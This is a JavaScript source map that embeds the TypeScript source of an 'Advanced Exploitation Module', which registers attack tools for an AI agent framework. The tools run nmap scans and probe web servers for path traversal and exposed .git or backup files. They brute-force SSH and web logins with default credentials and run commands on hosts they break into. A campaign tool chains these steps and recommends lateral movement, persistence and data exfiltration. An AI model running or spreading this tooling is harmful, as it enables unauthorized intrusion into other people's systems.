{"version":3,"names":["_nodeChild_process","require","_nodeFs","_nodePath","_nodeOs","makeEvidenceFile","prefix","dir","mkdtempSync","join","tmpdir","path","writeFileSync","Date","toISOString","runNmap","target","ports","result","execSync","encoding","timeout","error","message","runAdvancedNmap","options","detectWebVulnerabilities","port","vulns","checks","name","test","severity","description","exploitation","remediation","check","trim","push","type","sshCredentialAttack","evidencePath","commonCredentials","username","password","success","successfulCredential","commandOutput","cred","testCmd","includes","cmdResult","cmdError","attackType","details","credentialsTested","length","split","slice","timestamp","JSON","stringify","webCredentialAttack","loginEndpoints","successfulEndpoint","endpoint","protocol","loginTest","endpointsTested","apiExploitation","apiEndpoints","discoveredEndpoints","statusMatch","match","status","infoCheck","info","substring","totalEndpointsTested","createAdvancedExploitationTools","tools","addTool","handler","args","depth","results","scanResult","scan","openPorts","map","m","parseInt","vulnerabilities","webVulns","v","serviceChecks","ssh","ftp","database","recommendations","campaignResults","phases","phase","startTime","scanSummary","forEach","exploitationResults","sshResult","service","webPort","webResult","apiPort","apiResult","criticalFindings","filter","compromisedServices","r","s","id"],"sources":["advancedExploitation.ts"],"sourcesContent":["/**\n * Advanced Exploitation Module\n * Real-world exploitation capabilities integrated with AGI Core\n */\n\nimport { execSync } from 'node:child_process';\nimport { mkdtempSync, writeFileSync, readFileSync, existsSync } from 'node:fs';\nimport { join } from 'node:path';\nimport { tmpdir } from 'node:os';\nimport type { ToolDefinition } from '../core/toolRuntime.js';\n\nexport interface ExploitationResult {\n  success: boolean;\n  target: string;\n  attackType: string;\n  details: Record<string, any>;\n  evidencePath?: string;\n  timestamp: string;\n}\n\nexport interface Vulnerability {\n  type: string;\n  severity: 'low' | 'medium' | 'high' | 'critical';\n  description: string;\n  exploitation: string[];\n  remediation: string;\n}\n\n// Core exploitation utilities\nexport function makeEvidenceFile(prefix: string): string {\n  const dir = mkdtempSync(join(tmpdir(), `${prefix}-`));\n  const path = join(dir, 'evidence.txt');\n  writeFileSync(path, `Advanced exploitation evidence - ${new Date().toISOString()}`);\n  return path;\n}\n\nexport function runNmap(target: string, ports: string = '80,443,22,21,25,53,8080,8443,3306,3389,5432,27017,5985,5986'): string {\n  try {\n    const result = execSync(`/opt/homebrew/bin/nmap -sT -T4 -p ${ports} ${target}`, {\n      encoding: 'utf-8',\n      timeout: 24 * 60 * 60 * 1000 // 24 hours to prevent timeout errors during extensive scans\n    });\n    return result;\n  } catch (error: any) {\n    return `Scan failed: ${error.message}`;\n  }\n}\n\nexport function runAdvancedNmap(target: string, options: string = '-sV -sC -O --script=vuln'): string {\n  try {\n    const result = execSync(`/opt/homebrew/bin/nmap ${options} ${target}`, {\n      encoding: 'utf-8',\n      timeout: 24 * 60 * 60 * 1000 // 24 hours to prevent timeout errors during extensive scans\n    });\n    return result;\n  } catch (error: any) {\n    return `Advanced scan failed: ${error.message}`;\n  }\n}\n\n// Vulnerability detection\nexport function detectWebVulnerabilities(target: string, port: number): Vulnerability[] {\n  const vulns: Vulnerability[] = [];\n  \n  // Common web vulnerability checks\n  const checks = [\n    {\n      name: 'directory_traversal',\n      test: `timeout 5 curl -s -k \"http://${target}:${port}/../../../../etc/passwd\" 2>&1 | grep -E 'root:.*:/bin' || true`,\n      severity: 'high' as const,\n      description: 'Directory traversal vulnerability allows reading arbitrary files',\n      exploitation: ['Read system files', 'Extract credentials', 'Access sensitive data'],\n      remediation: 'Validate and sanitize file paths, use whitelists'\n    },\n    {\n      name: 'git_exposure',\n      test: `timeout 5 curl -s -k -I \"http://${target}:${port}/.git/config\" 2>&1 | head -1 | grep -E '200|301|302' || true`,\n      severity: 'critical' as const,\n      description: 'Exposed .git directory reveals source code and credentials',\n      exploitation: ['Source code extraction', 'Credential harvesting', 'Internal path discovery'],\n      remediation: 'Block access to .git directory, implement proper access controls'\n    },\n    {\n      name: 'phpinfo_exposure',\n      test: `timeout 5 curl -s -k \"http://${target}:${port}/phpinfo.php\" 2>&1 | grep -i 'php version' || true`,\n      severity: 'medium' as const,\n      description: 'phpinfo.php exposes PHP configuration and system information',\n      exploitation: ['Information disclosure', 'Version enumeration', 'Configuration analysis'],\n      remediation: 'Remove or restrict access to phpinfo.php'\n    },\n    {\n      name: 'backup_file_exposure',\n      test: `for ext in .bak .old .backup .save .orig; do timeout 2 curl -s -k -I \"http://${target}:${port}/index\\$ext\" 2>&1 | head -1 | grep -E '200|301|302' && echo \"found\" && break; done`,\n      severity: 'medium' as const,\n      description: 'Exposed backup files may contain sensitive information',\n      exploitation: ['Source code analysis', 'Credential extraction', 'Configuration discovery'],\n      remediation: 'Remove backup files from web directories'\n    }\n  ];\n  \n  for (const check of checks) {\n    try {\n      const result = execSync(check.test, { encoding: 'utf-8' });\n      if (result.trim()) {\n        vulns.push({\n          type: check.name,\n          severity: check.severity,\n          description: check.description,\n          exploitation: check.exploitation,\n          remediation: check.remediation\n        });\n      }\n    } catch {\n      // Continue checking other vulnerabilities\n    }\n  }\n  \n  return vulns;\n}\n\n// Credential attacks\nexport function sshCredentialAttack(target: string, port: number = 22): ExploitationResult {\n  const evidencePath = makeEvidenceFile('ssh-attack');\n  const commonCredentials = [\n    { username: 'root', password: 'root' },\n    { username: 'admin', password: 'admin' },\n    { username: 'ubuntu', password: 'ubuntu' },\n    { username: 'pi', password: 'raspberry' },\n    { username: 'test', password: 'test' },\n    { username: 'user', password: 'user' },\n    { username: 'administrator', password: 'administrator' },\n    { username: 'git', password: 'git' },\n    { username: 'nginx', password: 'nginx' },\n    { username: 'apache', password: 'apache' }\n  ];\n  \n  let success = false;\n  let successfulCredential = null;\n  let commandOutput = '';\n  \n  for (const cred of commonCredentials) {\n    try {\n      const testCmd = `sshpass -p \"${cred.password}\" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 -o BatchMode=yes -p ${port} ${cred.username}@${target} \"echo 'SSH_SUCCESS'\" 2>&1`;\n      const result = execSync(testCmd, { encoding: 'utf-8', timeout: 3000 });\n      \n      if (result.includes('SSH_SUCCESS')) {\n        success = true;\n        successfulCredential = cred;\n        \n        // Try to execute commands\n        try {\n          const cmdResult = execSync(\n            `sshpass -p \"${cred.password}\" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -p ${port} ${cred.username}@${target} \"id; uname -a; whoami; ls -la /tmp\" 2>&1`,\n            { encoding: 'utf-8', timeout: 5000 }\n          );\n          commandOutput = cmdResult;\n        } catch (cmdError) {\n          commandOutput = 'Command execution failed';\n        }\n        break;\n      }\n    } catch (error) {\n      // Continue to next credential\n      continue;\n    }\n  }\n  \n  const result: ExploitationResult = {\n    success,\n    target,\n    attackType: 'ssh_credential_attack',\n    details: {\n      credentialsTested: commonCredentials.length,\n      successfulCredential,\n      commandOutput: commandOutput.split('\\n').slice(0, 20),\n      port\n    },\n    evidencePath,\n    timestamp: new Date().toISOString()\n  };\n  \n  // Write evidence\n  writeFileSync(evidencePath, JSON.stringify(result, null, 2));\n  \n  return result;\n}\n\n// Web exploitation\nexport function webCredentialAttack(target: string, port: number = 443): ExploitationResult {\n  const evidencePath = makeEvidenceFile('web-attack');\n  const commonCredentials = [\n    { username: 'admin', password: 'admin' },\n    { username: 'admin', password: 'password' },\n    { username: 'admin', password: '123456' },\n    { username: 'administrator', password: 'administrator' },\n    { username: 'root', password: 'root' },\n    { username: 'user', password: 'user' },\n    { username: 'guest', password: 'guest' },\n    { username: 'test', password: 'test' }\n  ];\n  \n  const loginEndpoints = ['/login', '/admin/login', '/wp-login.php', '/administrator/login'];\n  let success = false;\n  let successfulEndpoint = '';\n  let successfulCredential = null;\n  \n  for (const endpoint of loginEndpoints) {\n    for (const cred of commonCredentials) {\n      try {\n        const protocol = port === 443 ? 'https' : 'http';\n        const loginTest = execSync(\n          `timeout 5 curl -s -k -X POST --data \"username=${cred.username}&password=${cred.password}\" \"${protocol}://${target}:${port}${endpoint}\" 2>&1 | grep -i 'success\\\\|dashboard\\\\|welcome\\\\|logged' || true`,\n          { encoding: 'utf-8' }\n        );\n        \n        if (loginTest.trim()) {\n          success = true;\n          successfulEndpoint = endpoint;\n          successfulCredential = cred;\n          break;\n        }\n      } catch {\n        continue;\n      }\n    }\n    if (success) break;\n  }\n  \n  const result: ExploitationResult = {\n    success,\n    target,\n    attackType: 'web_credential_attack',\n    details: {\n      endpointsTested: loginEndpoints,\n      credentialsTested: commonCredentials.length,\n      successfulEndpoint,\n      successfulCredential,\n      port\n    },\n    evidencePath,\n    timestamp: new Date().toISOString()\n  };\n  \n  writeFileSync(evidencePath, JSON.stringify(result, null, 2));\n  \n  return result;\n}\n\n// API exploitation\nexport function apiExploitation(target: string, port: number = 443): ExploitationResult {\n  const evidencePath = makeEvidenceFile('api-exploit');\n  const apiEndpoints = [\n    '/api', '/api/v1', '/rest', '/graphql', '/swagger', '/openapi',\n    '/api/docs', '/api/console', '/api/explorer'\n  ];\n  \n  const discoveredEndpoints: Array<{ endpoint: string; status: string; info: string }> = [];\n  \n  for (const endpoint of apiEndpoints) {\n    try {\n      const protocol = port === 443 ? 'https' : 'http';\n      const check = execSync(\n        `timeout 5 curl -s -k -I \"${protocol}://${target}:${port}${endpoint}\" 2>&1 | head -1`,\n        { encoding: 'utf-8' }\n      );\n      \n      const statusMatch = check.match(/(\\d{3})/);\n      if (statusMatch) {\n        const status = statusMatch[1];\n        if (status !== '404') {\n          // Get more info\n          const infoCheck = execSync(\n            `timeout 5 curl -s -k \"${protocol}://${target}:${port}${endpoint}\" 2>&1 | head -100`,\n            { encoding: 'utf-8' }\n          );\n          \n          discoveredEndpoints.push({\n            endpoint,\n            status,\n            info: infoCheck.substring(0, 500)\n          });\n        }\n      }\n    } catch {\n      continue;\n    }\n  }\n  \n  const result: ExploitationResult = {\n    success: discoveredEndpoints.length > 0,\n    target,\n    attackType: 'api_discovery',\n    details: {\n      discoveredEndpoints,\n      totalEndpointsTested: apiEndpoints.length,\n      port\n    },\n    evidencePath,\n    timestamp: new Date().toISOString()\n  };\n  \n  writeFileSync(evidencePath, JSON.stringify(result, null, 2));\n  \n  return result;\n}\n\n// Comprehensive exploitation handler\nexport function createAdvancedExploitationTools() {\n  const tools: ToolDefinition[] = [];\n  \n  const addTool = (name: string, description: string, handler: ToolDefinition['handler']) => {\n    tools.push({ name, description, handler });\n  };\n  \n  // Network reconnaissance\n  addTool('AdvancedRecon', 'Comprehensive network reconnaissance with vulnerability detection', async (args: any) => {\n    const target = args.target || 'localhost';\n    const ports = args.ports || '80,443,22,21,25,53,8080,8443';\n    const depth = args.depth || 'standard';\n    \n    const evidencePath = makeEvidenceFile('advanced-recon');\n    const results: any = { target, timestamp: new Date().toISOString() };\n    \n    try {\n      // Network scan\n      const scanResult = depth === 'deep' ? runAdvancedNmap(target) : runNmap(target, ports);\n      results.scan = scanResult;\n      \n      // Parse open ports\n      const openPorts = scanResult.match(/(\\d+)\\/tcp\\s+open/g)?.map((m: string) => parseInt(m)) || [];\n      results.openPorts = openPorts;\n      \n      // Vulnerability detection\n      const vulnerabilities: Vulnerability[] = [];\n      for (const port of openPorts) {\n        if (port === 80 || port === 443 || port === 8080 || port === 8443) {\n          const webVulns = detectWebVulnerabilities(target, port);\n          vulnerabilities.push(...webVulns.map(v => ({ ...v, port })));\n        }\n      }\n      results.vulnerabilities = vulnerabilities;\n      \n      // Service-specific checks\n      const serviceChecks: any = {};\n      if (openPorts.includes(22)) {\n        serviceChecks.ssh = 'SSH service detected - credential attack possible';\n      }\n      if (openPorts.includes(21)) {\n        serviceChecks.ftp = 'FTP service detected - anonymous login check recommended';\n      }\n      if (openPorts.includes(3306) || openPorts.includes(5432)) {\n        serviceChecks.database = 'Database service detected - default credential check recommended';\n      }\n      results.serviceChecks = serviceChecks;\n      \n      results.evidencePath = evidencePath;\n      results.recommendations = vulnerabilities.length > 0 \n        ? vulnerabilities.map(v => `Exploit ${v.type} (${v.severity}): ${v.exploitation.join(', ')}`)\n        : ['Perform deeper enumeration', 'Check for misconfigurations', 'Test default credentials'];\n      \n    } catch (error: any) {\n      results.error = error.message;\n    }\n    \n    // Write evidence\n    writeFileSync(evidencePath, JSON.stringify(results, null, 2));\n    \n    return JSON.stringify(results, null, 2);\n  });\n  \n  // Credential attacks\n  addTool('CredentialAttack', 'SSH and web credential brute force attacks', async (args: any) => {\n    const target = args.target || 'localhost';\n    const attackType = args.attackType || 'ssh';\n    const port = args.port || (attackType === 'ssh' ? 22 : 443);\n    \n    let result: ExploitationResult;\n    \n    if (attackType === 'ssh') {\n      result = sshCredentialAttack(target, port);\n    } else if (attackType === 'web') {\n      result = webCredentialAttack(target, port);\n    } else {\n      result = {\n        success: false,\n        target,\n        attackType: 'unknown',\n        details: { error: `Unknown attack type: ${attackType}` },\n        timestamp: new Date().toISOString()\n      };\n    }\n    \n    return JSON.stringify(result, null, 2);\n  });\n  \n  // API exploitation\n  addTool('APIExploitation', 'Discover and exploit exposed APIs', async (args: any) => {\n    const target = args.target || 'localhost';\n    const port = args.port || 443;\n    \n    const result = apiExploitation(target, port);\n    return JSON.stringify(result, null, 2);\n  });\n  \n  // Full exploitation campaign\n  addTool('FullExploitationCampaign', 'Complete exploitation campaign against target', async (args: any) => {\n    const target = args.target || 'localhost';\n    const evidencePath = makeEvidenceFile('full-campaign');\n    \n    const campaignResults: any = {\n      target,\n      timestamp: new Date().toISOString(),\n      phases: []\n    };\n    \n    try {\n      // Phase 1: Reconnaissance\n      campaignResults.phases.push({\n        phase: 'reconnaissance',\n        startTime: new Date().toISOString()\n      });\n      \n      const scanResult = runAdvancedNmap(target);\n      const openPorts = scanResult.match(/(\\d+)\\/tcp\\s+open/g)?.map((m: string) => parseInt(m)) || [];\n      \n      campaignResults.phases[0].results = {\n        scanSummary: scanResult.split('\\n').slice(0, 50),\n        openPorts\n      };\n      \n      // Phase 2: Vulnerability Assessment\n      campaignResults.phases.push({\n        phase: 'vulnerability_assessment',\n        startTime: new Date().toISOString()\n      });\n      \n      const vulnerabilities: any[] = [];\n      for (const port of openPorts) {\n        if (port === 80 || port === 443 || port === 8080 || port === 8443) {\n          const webVulns = detectWebVulnerabilities(target, port);\n          webVulns.forEach(v => vulnerabilities.push({ ...v, port }));\n        }\n      }\n      \n      campaignResults.phases[1].results = { vulnerabilities };\n      \n      // Phase 3: Exploitation Attempts\n      campaignResults.phases.push({\n        phase: 'exploitation',\n        startTime: new Date().toISOString()\n      });\n      \n      const exploitationResults: any[] = [];\n      \n      // SSH attack if port 22 open\n      if (openPorts.includes(22)) {\n        const sshResult = sshCredentialAttack(target, 22);\n        exploitationResults.push({\n          service: 'ssh',\n          result: sshResult.success ? 'COMPROMISED' : 'failed',\n          details: sshResult.details\n        });\n      }\n      \n      // Web attack if HTTP/HTTPS ports open\n      if (openPorts.includes(80) || openPorts.includes(443) || openPorts.includes(8080) || openPorts.includes(8443)) {\n        const webPort = openPorts.includes(443) ? 443 : openPorts.includes(80) ? 80 : openPorts.includes(8443) ? 8443 : 8080;\n        const webResult = webCredentialAttack(target, webPort);\n        exploitationResults.push({\n          service: 'web',\n          result: webResult.success ? 'COMPROMISED' : 'failed',\n          details: webResult.details\n        });\n      }\n      \n      // API discovery\n      if (openPorts.includes(80) || openPorts.includes(443)) {\n        const apiPort = openPorts.includes(443) ? 443 : 80;\n        const apiResult = apiExploitation(target, apiPort);\n        exploitationResults.push({\n          service: 'api',\n          result: apiResult.success ? 'DISCOVERED' : 'none',\n          details: apiResult.details\n        });\n      }\n      \n      campaignResults.phases[2].results = { exploitationResults };\n      \n      // Phase 4: Summary and Recommendations\n      campaignResults.phases.push({\n        phase: 'summary',\n        startTime: new Date().toISOString()\n      });\n      \n      const criticalFindings = vulnerabilities.filter(v => v.severity === 'critical' || v.severity === 'high');\n      const compromisedServices = exploitationResults.filter(r => r.result === 'COMPROMISED');\n      \n      campaignResults.phases[3].results = {\n        criticalFindings: criticalFindings.length,\n        compromisedServices: compromisedServices.length,\n        recommendations: [\n          ...criticalFindings.map(v => `Exploit ${v.type}: ${v.exploitation.join(', ')}`),\n          ...compromisedServices.map(s => `Leverage ${s.service} access for further exploitation`),\n          'Perform lateral movement',\n          'Establish persistence',\n          'Exfiltrate data'\n        ]\n      };\n      \n      campaignResults.success = compromisedServices.length > 0 || criticalFindings.length > 0;\n      campaignResults.evidencePath = evidencePath;\n      \n    } catch (error: any) {\n      campaignResults.error = error.message;\n      campaignResults.success = false;\n    }\n    \n    // Write evidence\n    writeFileSync(evidencePath, JSON.stringify(campaignResults, null, 2));\n    \n    return JSON.stringify(campaignResults, null, 2);\n  });\n  \n  return { id: 'advanced-exploitation', tools };\n}"],"mappings":";;;;;;;;;;;;;AAKA,IAAAA,kBAAA,GAAAC,OAAA;AACA,IAAAC,OAAA,GAAAD,OAAA;AACA,IAAAE,SAAA,GAAAF,OAAA;AACA,IAAAG,OAAA,GAAAH,OAAA;AARA;AACA;AACA;AACA;;AAyBA;AACO,SAASI,gBAAgBA,CAACC,MAAc,EAAU;EACvD,MAAMC,GAAG,GAAG,IAAAC,mBAAW,EAAC,IAAAC,cAAI,EAAC,IAAAC,cAAM,EAAC,CAAC,EAAE,GAAGJ,MAAM,GAAG,CAAC,CAAC;EACrD,MAAMK,IAAI,GAAG,IAAAF,cAAI,EAACF,GAAG,EAAE,cAAc,CAAC;EACtC,IAAAK,qBAAa,EAACD,IAAI,EAAE,oCAAoC,IAAIE,IAAI,CAAC,CAAC,CAACC,WAAW,CAAC,CAAC,EAAE,CAAC;EACnF,OAAOH,IAAI;AACb;AAEO,SAASI,OAAOA,CAACC,MAAc,EAAEC,KAAa,GAAG,6DAA6D,EAAU;EAC7H,IAAI;IACF,MAAMC,MAAM,GAAG,IAAAC,2BAAQ,EAAC,qCAAqCF,KAAK,IAAID,MAAM,EAAE,EAAE;MAC9EI,QAAQ,EAAE,OAAO;MACjBC,OAAO,EAAE,EAAE,GAAG,EAAE,GAAG,EAAE,GAAG,IAAI,CAAC;IAC/B,CAAC,CAAC;IACF,OAAOH,MAAM;EACf,CAAC,CAAC,OAAOI,KAAU,EAAE;IACnB,OAAO,gBAAgBA,KAAK,CAACC,OAAO,EAAE;EACxC;AACF;AAEO,SAASC,eAAeA,CAACR,MAAc,EAAES,OAAe,GAAG,0BAA0B,EAAU;EACpG,IAAI;IACF,MAAMP,MAAM,GAAG,IAAAC,2BAAQ,EAAC,0BAA0BM,OAAO,IAAIT,MAAM,EAAE,EAAE;MACrEI,QAAQ,EAAE,OAAO;MACjBC,OAAO,EAAE,EAAE,GAAG,EAAE,GAAG,EAAE,GAAG,IAAI,CAAC;IAC/B,CAAC,CAAC;IACF,OAAOH,MAAM;EACf,CAAC,CAAC,OAAOI,KAAU,EAAE;IACnB,OAAO,yBAAyBA,KAAK,CAACC,OAAO,EAAE;EACjD;AACF;;AAEA;AACO,SAASG,wBAAwBA,CAACV,MAAc,EAAEW,IAAY,EAAmB;EACtF,MAAMC,KAAsB,GAAG,EAAE;;EAEjC;EACA,MAAMC,MAAM,GAAG,CACb;IACEC,IAAI,EAAE,qBAAqB;IAC3BC,IAAI,EAAE,gCAAgCf,MAAM,IAAIW,IAAI,gEAAgE;IACpHK,QAAQ,EAAE,MAAe;IACzBC,WAAW,EAAE,kEAAkE;IAC/EC,YAAY,EAAE,CAAC,mBAAmB,EAAE,qBAAqB,EAAE,uBAAuB,CAAC;IACnFC,WAAW,EAAE;EACf,CAAC,EACD;IACEL,IAAI,EAAE,cAAc;IACpBC,IAAI,EAAE,mCAAmCf,MAAM,IAAIW,IAAI,8DAA8D;IACrHK,QAAQ,EAAE,UAAmB;IAC7BC,WAAW,EAAE,4DAA4D;IACzEC,YAAY,EAAE,CAAC,wBAAwB,EAAE,uBAAuB,EAAE,yBAAyB,CAAC;IAC5FC,WAAW,EAAE;EACf,CAAC,EACD;IACEL,IAAI,EAAE,kBAAkB;IACxBC,IAAI,EAAE,gCAAgCf,MAAM,IAAIW,IAAI,oDAAoD;IACxGK,QAAQ,EAAE,QAAiB;IAC3BC,WAAW,EAAE,8DAA8D;IAC3EC,YAAY,EAAE,CAAC,wBAAwB,EAAE,qBAAqB,EAAE,wBAAwB,CAAC;IACzFC,WAAW,EAAE;EACf,CAAC,EACD;IACEL,IAAI,EAAE,sBAAsB;IAC5BC,IAAI,EAAE,gFAAgFf,MAAM,IAAIW,IAAI,oFAAoF;IACxLK,QAAQ,EAAE,QAAiB;IAC3BC,WAAW,EAAE,wDAAwD;IACrEC,YAAY,EAAE,CAAC,sBAAsB,EAAE,uBAAuB,EAAE,yBAAyB,CAAC;IAC1FC,WAAW,EAAE;EACf,CAAC,CACF;EAED,KAAK,MAAMC,KAAK,IAAIP,MAAM,EAAE;IAC1B,IAAI;MACF,MAAMX,MAAM,GAAG,IAAAC,2BAAQ,EAACiB,KAAK,CAACL,IAAI,EAAE;QAAEX,QAAQ,EAAE;MAAQ,CAAC,CAAC;MAC1D,IAAIF,MAAM,CAACmB,IAAI,CAAC,CAAC,EAAE;QACjBT,KAAK,CAACU,IAAI,CAAC;UACTC,IAAI,EAAEH,KAAK,CAACN,IAAI;UAChBE,QAAQ,EAAEI,KAAK,CAACJ,QAAQ;UACxBC,WAAW,EAAEG,KAAK,CAACH,WAAW;UAC9BC,YAAY,EAAEE,KAAK,CAACF,YAAY;UAChCC,WAAW,EAAEC,KAAK,CAACD;QACrB,CAAC,CAAC;MACJ;IACF,CAAC,CAAC,MAAM;MACN;IAAA;EAEJ;EAEA,OAAOP,KAAK;AACd;;AAEA;AACO,SAASY,mBAAmBA,CAACxB,MAAc,EAAEW,IAAY,GAAG,EAAE,EAAsB;EACzF,MAAMc,YAAY,GAAGpC,gBAAgB,CAAC,YAAY,CAAC;EACnD,MAAMqC,iBAAiB,GAAG,CACxB;IAAEC,QAAQ,EAAE,MAAM;IAAEC,QAAQ,EAAE;EAAO,CAAC,EACtC;IAAED,QAAQ,EAAE,OAAO;IAAEC,QAAQ,EAAE;EAAQ,CAAC,EACxC;IAAED,QAAQ,EAAE,QAAQ;IAAEC,QAAQ,EAAE;EAAS,CAAC,EAC1C;IAAED,QAAQ,EAAE,IAAI;IAAEC,QAAQ,EAAE;EAAY,CAAC,EACzC;IAAED,QAAQ,EAAE,MAAM;IAAEC,QAAQ,EAAE;EAAO,CAAC,EACtC;IAAED,QAAQ,EAAE,MAAM;IAAEC,QAAQ,EAAE;EAAO,CAAC,EACtC;IAAED,QAAQ,EAAE,eAAe;IAAEC,QAAQ,EAAE;EAAgB,CAAC,EACxD;IAAED,QAAQ,EAAE,KAAK;IAAEC,QAAQ,EAAE;EAAM,CAAC,EACpC;IAAED,QAAQ,EAAE,OAAO;IAAEC,QAAQ,EAAE;EAAQ,CAAC,EACxC;IAAED,QAAQ,EAAE,QAAQ;IAAEC,QAAQ,EAAE;EAAS,CAAC,CAC3C;EAED,IAAIC,OAAO,GAAG,KAAK;EACnB,IAAIC,oBAAoB,GAAG,IAAI;EAC/B,IAAIC,aAAa,GAAG,EAAE;EAEtB,KAAK,MAAMC,IAAI,IAAIN,iBAAiB,EAAE;IACpC,IAAI;MACF,MAAMO,OAAO,GAAG,eAAeD,IAAI,CAACJ,QAAQ,6EAA6EjB,IAAI,IAAIqB,IAAI,CAACL,QAAQ,IAAI3B,MAAM,4BAA4B;MACpL,MAAME,MAAM,GAAG,IAAAC,2BAAQ,EAAC8B,OAAO,EAAE;QAAE7B,QAAQ,EAAE,OAAO;QAAEC,OAAO,EAAE;MAAK,CAAC,CAAC;MAEtE,IAAIH,MAAM,CAACgC,QAAQ,CAAC,aAAa,CAAC,EAAE;QAClCL,OAAO,GAAG,IAAI;QACdC,oBAAoB,GAAGE,IAAI;;QAE3B;QACA,IAAI;UACF,MAAMG,SAAS,GAAG,IAAAhC,2BAAQ,EACxB,eAAe6B,IAAI,CAACJ,QAAQ,4DAA4DjB,IAAI,IAAIqB,IAAI,CAACL,QAAQ,IAAI3B,MAAM,2CAA2C,EAClK;YAAEI,QAAQ,EAAE,OAAO;YAAEC,OAAO,EAAE;UAAK,CACrC,CAAC;UACD0B,aAAa,GAAGI,SAAS;QAC3B,CAAC,CAAC,OAAOC,QAAQ,EAAE;UACjBL,aAAa,GAAG,0BAA0B;QAC5C;QACA;MACF;IACF,CAAC,CAAC,OAAOzB,KAAK,EAAE;MACd;MACA;IACF;EACF;EAEA,MAAMJ,MAA0B,GAAG;IACjC2B,OAAO;IACP7B,MAAM;IACNqC,UAAU,EAAE,uBAAuB;IACnCC,OAAO,EAAE;MACPC,iBAAiB,EAAEb,iBAAiB,CAACc,MAAM;MAC3CV,oBAAoB;MACpBC,aAAa,EAAEA,aAAa,CAACU,KAAK,CAAC,IAAI,CAAC,CAACC,KAAK,CAAC,CAAC,EAAE,EAAE,CAAC;MACrD/B;IACF,CAAC;IACDc,YAAY;IACZkB,SAAS,EAAE,IAAI9C,IAAI,CAAC,CAAC,CAACC,WAAW,CAAC;EACpC,CAAC;;EAED;EACA,IAAAF,qBAAa,EAAC6B,YAAY,EAAEmB,IAAI,CAACC,SAAS,CAAC3C,MAAM,EAAE,IAAI,EAAE,CAAC,CAAC,CAAC;EAE5D,OAAOA,MAAM;AACf;;AAEA;AACO,SAAS4C,mBAAmBA,CAAC9C,MAAc,EAAEW,IAAY,GAAG,GAAG,EAAsB;EAC1F,MAAMc,YAAY,GAAGpC,gBAAgB,CAAC,YAAY,CAAC;EACnD,MAAMqC,iBAAiB,GAAG,CACxB;IAAEC,QAAQ,EAAE,OAAO;IAAEC,QAAQ,EAAE;EAAQ,CAAC,EACxC;IAAED,QAAQ,EAAE,OAAO;IAAEC,QAAQ,EAAE;EAAW,CAAC,EAC3C;IAAED,QAAQ,EAAE,OAAO;IAAEC,QAAQ,EAAE;EAAS,CAAC,EACzC;IAAED,QAAQ,EAAE,eAAe;IAAEC,QAAQ,EAAE;EAAgB,CAAC,EACxD;IAAED,QAAQ,EAAE,MAAM;IAAEC,QAAQ,EAAE;EAAO,CAAC,EACtC;IAAED,QAAQ,EAAE,MAAM;IAAEC,QAAQ,EAAE;EAAO,CAAC,EACtC;IAAED,QAAQ,EAAE,OAAO;IAAEC,QAAQ,EAAE;EAAQ,CAAC,EACxC;IAAED,QAAQ,EAAE,MAAM;IAAEC,QAAQ,EAAE;EAAO,CAAC,CACvC;EAED,MAAMmB,cAAc,GAAG,CAAC,QAAQ,EAAE,cAAc,EAAE,eAAe,EAAE,sBAAsB,CAAC;EAC1F,IAAIlB,OAAO,GAAG,KAAK;EACnB,IAAImB,kBAAkB,GAAG,EAAE;EAC3B,IAAIlB,oBAAoB,GAAG,IAAI;EAE/B,KAAK,MAAMmB,QAAQ,IAAIF,cAAc,EAAE;IACrC,KAAK,MAAMf,IAAI,IAAIN,iBAAiB,EAAE;MACpC,IAAI;QACF,MAAMwB,QAAQ,GAAGvC,IAAI,KAAK,GAAG,GAAG,OAAO,GAAG,MAAM;QAChD,MAAMwC,SAAS,GAAG,IAAAhD,2BAAQ,EACxB,iDAAiD6B,IAAI,CAACL,QAAQ,aAAaK,IAAI,CAACJ,QAAQ,MAAMsB,QAAQ,MAAMlD,MAAM,IAAIW,IAAI,GAAGsC,QAAQ,mEAAmE,EACxM;UAAE7C,QAAQ,EAAE;QAAQ,CACtB,CAAC;QAED,IAAI+C,SAAS,CAAC9B,IAAI,CAAC,CAAC,EAAE;UACpBQ,OAAO,GAAG,IAAI;UACdmB,kBAAkB,GAAGC,QAAQ;UAC7BnB,oBAAoB,GAAGE,IAAI;UAC3B;QACF;MACF,CAAC,CAAC,MAAM;QACN;MACF;IACF;IACA,IAAIH,OAAO,EAAE;EACf;EAEA,MAAM3B,MAA0B,GAAG;IACjC2B,OAAO;IACP7B,MAAM;IACNqC,UAAU,EAAE,uBAAuB;IACnCC,OAAO,EAAE;MACPc,eAAe,EAAEL,cAAc;MAC/BR,iBAAiB,EAAEb,iBAAiB,CAACc,MAAM;MAC3CQ,kBAAkB;MAClBlB,oBAAoB;MACpBnB;IACF,CAAC;IACDc,YAAY;IACZkB,SAAS,EAAE,IAAI9C,IAAI,CAAC,CAAC,CAACC,WAAW,CAAC;EACpC,CAAC;EAED,IAAAF,qBAAa,EAAC6B,YAAY,EAAEmB,IAAI,CAACC,SAAS,CAAC3C,MAAM,EAAE,IAAI,EAAE,CAAC,CAAC,CAAC;EAE5D,OAAOA,MAAM;AACf;;AAEA;AACO,SAASmD,eAAeA,CAACrD,MAAc,EAAEW,IAAY,GAAG,GAAG,EAAsB;EACtF,MAAMc,YAAY,GAAGpC,gBAAgB,CAAC,aAAa,CAAC;EACpD,MAAMiE,YAAY,GAAG,CACnB,MAAM,EAAE,SAAS,EAAE,OAAO,EAAE,UAAU,EAAE,UAAU,EAAE,UAAU,EAC9D,WAAW,EAAE,cAAc,EAAE,eAAe,CAC7C;EAED,MAAMC,mBAA8E,GAAG,EAAE;EAEzF,KAAK,MAAMN,QAAQ,IAAIK,YAAY,EAAE;IACnC,IAAI;MACF,MAAMJ,QAAQ,GAAGvC,IAAI,KAAK,GAAG,GAAG,OAAO,GAAG,MAAM;MAChD,MAAMS,KAAK,GAAG,IAAAjB,2BAAQ,EACpB,4BAA4B+C,QAAQ,MAAMlD,MAAM,IAAIW,IAAI,GAAGsC,QAAQ,kBAAkB,EACrF;QAAE7C,QAAQ,EAAE;MAAQ,CACtB,CAAC;MAED,MAAMoD,WAAW,GAAGpC,KAAK,CAACqC,KAAK,CAAC,SAAS,CAAC;MAC1C,IAAID,WAAW,EAAE;QACf,MAAME,MAAM,GAAGF,WAAW,CAAC,CAAC,CAAC;QAC7B,IAAIE,MAAM,KAAK,KAAK,EAAE;UACpB;UACA,MAAMC,SAAS,GAAG,IAAAxD,2BAAQ,EACxB,yBAAyB+C,QAAQ,MAAMlD,MAAM,IAAI